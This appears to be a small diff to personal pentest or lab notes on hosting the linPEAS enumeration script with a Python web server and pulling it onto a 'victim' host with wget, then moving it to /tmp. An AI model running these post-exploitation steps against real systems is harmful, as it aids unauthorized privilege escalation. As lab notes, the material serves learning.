@@ -64,6 +64,7 @@ web server from the victim side. Basically hosting linPeas utulizing python thro
 up on a webpage and the downloading it from victim.
 
 (VICTIM) wget http://192.168.122.209:8000/linpeas.sh
+(VICTIM) ls
 (VICTIM) mv linpeas.sh /tmp
 (VICTIM) cd /tmp
 (VICTIM) ls
